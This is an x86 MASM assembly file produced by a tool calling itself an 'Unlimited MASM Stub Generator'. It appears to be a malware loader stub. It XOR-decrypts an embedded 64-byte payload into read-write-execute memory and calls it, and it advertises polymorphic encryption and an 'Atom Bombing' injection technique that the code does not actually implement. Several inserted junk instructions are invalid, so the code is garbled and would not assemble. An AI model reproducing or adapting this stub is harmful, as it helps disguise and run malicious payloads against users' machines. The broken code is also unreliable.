; ===== UNLIMITED MASM STUB GENERATOR =====
; Generation ID: 808632
; Timestamp: 1754534910
; Encryption Method: XOR_POLY
; Stub Technique: ATOM_BOMBING
; Embedded Data Size: 64 bytes
; XOR polymorphic encryption applied

.386
.model flat, stdcall
option casemap :none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\msvcrt.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\msvcrt.lib

.data
    data_68103 db 0e4h, 052h, 02ch, 01dh, 006h, 003h, 003h, 005h, 008h, 004h, 004h, 00ch, 0ffh, 01ah, 000h, 0e5h
    06bh, 0b8h, 0b8h, 0d3h, 000h, 000h, 000h, 000h, 080h, 040h, 040h, 0c0h, 000h, 000h, 000h, 000h
    000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    07fh, 07ah, 061h, 069h, 0a6h, 0d9h, 010h, 038h, 015h, 027h, 0b5h, 0dch, 0abh, 000h, 000h, 03bh
    size_8320 dd 64
    key_46713 dd 015619bh
    junk_data_808632 db 044h, 00dh, 0d4h, 0c3h, 096h, 08ah, 0e5h, 0a2h, 0d3h, 010h, 0e6h, 05eh, 0bah, 09eh, 052h, 092h
    0ebh, 0deh, 037h, 012h, 090h, 0a8h, 0f0h, 0ech, 04ch, 094h, 0c9h, 009h, 016h, 0bfh, 0c5h, 010h
    0c9h, 05ch, 0d5h, 09fh, 072h, 083h, 0efh, 02ah, 06dh, 0b6h, 0b3h, 063h, 00bh
    success_msg db "Execution completed successfully", 0
    error_msg db "Failed to execute payload", 0

.data?
    mem_ptr dd ?
    old_protect dd ?
    bytes_written dd ?

.code
main_24203:
    ; Polymorphic entry point
    push sp, esi
    nop
    rol edx, bx
    nop
    add eax, cl
    nop
    ; Allocate executable memory
    invoke VirtualAlloc, 0, size_8320, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE
    test eax, eax
    jz error_exit
    mov mem_ptr, eax

    xor esp, bl
    nop
    sub dl, eax
    nop
    ; Call decryption routine
    call decrypt_18225

    ; Execute payload based on technique: ATOM_BOMBING
    call exec_82699

    ; Cleanup
    invoke VirtualFree, mem_ptr, 0, MEM_RELEASE
    invoke MessageBoxA, 0, addr success_msg, addr success_msg, MB_OK
    invoke ExitProcess, 0

decrypt_18225 proc
    push esi
    push edi
    push ecx
    push edx

    add al, al
    nop
    mov dx, dx
    nop
    ; Copy encrypted data to allocated memory
    mov esi, offset data_68103
    mov edi, mem_ptr
    mov ecx, size_8320
    rep movsb

    ; Standard XOR decryption
    mov esi, mem_ptr
    mov ecx, size_8320
    mov edx, key_46713
decrypt_xor_loop:
    test ecx, ecx
    jz decrypt_done
    mov al, byte ptr [esi]
    xor al, dl
    ror dl, 1  ; Rotate key for polymorphism
    mov byte ptr [esi], al
    inc esi
    dec ecx
    jmp decrypt_xor_loop
decrypt_done:
    rol bl, ecx
    nop
    pop edx
    pop ecx
    pop edi
    pop esi
    ret
decrypt_18225 endp

exec_82699 proc
    push ebp
    mov ebp, esp

    pop al, sp
    nop
    sub si, dh
    nop
    ; Default execution method
    push mem_ptr
    call mem_ptr
    jmp exec_done

exec_error:
    invoke MessageBoxA, 0, addr error_msg, addr error_msg, MB_OK

exec_done:
    mov esp, ebp
    pop ebp
    ret
exec_82699 endp

error_exit:
    invoke MessageBoxA, 0, addr error_msg, addr error_msg, MB_OK
    invoke ExitProcess, 1

end main_24203
